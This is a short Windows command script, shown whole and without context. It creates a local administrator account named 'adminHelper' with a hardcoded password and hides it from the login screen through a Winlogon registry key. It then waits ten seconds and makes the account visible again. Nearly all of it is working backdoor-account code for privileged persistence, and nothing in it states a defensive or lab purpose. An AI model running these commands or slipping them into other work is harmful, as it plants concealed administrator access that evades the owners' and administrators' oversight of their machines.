# Create hidden admin account
net user adminHelper P@ssw0rd123! /add
net localgroup Administrators adminHelper /add

# Hide from login screen
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v adminHelper /t REG_DWORD /d 0 /f

# Wait 10 seconds before un-hiding
Start-Sleep -s 10

# Unhide user (so it appears on login)
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v adminHelper /f